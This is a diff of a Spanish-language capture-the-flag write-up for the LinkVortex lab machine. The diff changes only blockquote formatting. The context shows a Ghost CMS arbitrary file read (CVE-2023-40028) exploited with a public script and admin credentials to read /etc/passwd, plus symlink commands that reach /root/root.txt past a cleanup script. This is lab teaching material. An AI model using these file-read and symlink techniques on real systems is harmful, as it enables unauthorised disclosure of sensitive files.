@@ -433,7 +433,8 @@ Ahora haciendo uso de la herramienta ==ports.py== que tengo publicada en github,
 <h2 id="cve-2023-40028-ghost-cms-arbitrary-file-read">CVE-2023-40028: Ghost CMS Arbitrary File Read<a hidden class="anchor" aria-hidden="true" href="#cve-2023-40028-ghost-cms-arbitrary-file-read">#</a></h2>
 <p>En el whatweb anterior veíamos la versión de Ghost que se estaba usando, la 5.58. Ahora que estamos dentro de su panel vamos a buscar posibles vulnerabilidades.</p>
 <blockquote>
-<p>Ghost es un sistema de gestión de contenidos (CMS) de código abierto. Las versiones anteriores a la 5.59.1 están sujetas a una vulnerabilidad que permite a los usuarios autenticados cargar archivos que son enlaces simbólicos. Esto puede ser explotado para realizar una lectura arbitraria de cualquier archivo en el sistema operativo anfitrión.</p></blockquote>
+<p>Ghost es un sistema de gestión de contenidos (CMS) de código abierto. Las versiones anteriores a la 5.59.1 están sujetas a una vulnerabilidad que permite a los usuarios autenticados cargar archivos que son enlaces simbólicos. Esto puede ser explotado para realizar una lectura arbitraria de cualquier archivo en el sistema operativo anfitrión.</p>
+</blockquote>
 <p><a href="https://github.com/godylockz/CVE-2023-40028/tree/main">https://github.com/godylockz/CVE-2023-40028/tree/main</a></p>
 <p>Utilizando este script en python conseguimos leer el archivo /etc/passwd y ademas nos recomienda leer otros archivo de configuración en el cual hay unas credenciales también.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ python3 cve-2023-40028.py -t http://linkvortex.htb -u admin@linkvortex.htb -p OctopiFociPilfer45
@@ -519,7 +520,8 @@ Ahora haciendo uso de la herramienta ==ports.py== que tengo publicada en github,
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bob@linkvortex:~$ ln -s /root/root.txt hit.txt
 </span></span><span style="display:flex;"><span>bob@linkvortex:~$ ln -s /home/bob/hit.txt hit.png
 </span></span></code></pre></div><blockquote>
-<p>Para que el bypass funcione es importante definir la ruta absoluta, sino no funcionará.</p></blockquote>
+<p>Para que el bypass funcione es importante definir la ruta absoluta, sino no funcionará.</p>
+</blockquote>
 <p>Si ahora ejecutamos el script funcionará pero no podremos ver el contenido ya que el CHECK_CONTENT por defecto esta como ==false==.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#codigo del script y porque no nos muestra el contenido</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> $CHECK_CONTENT;<span style="color:#66d9ef">then</span>
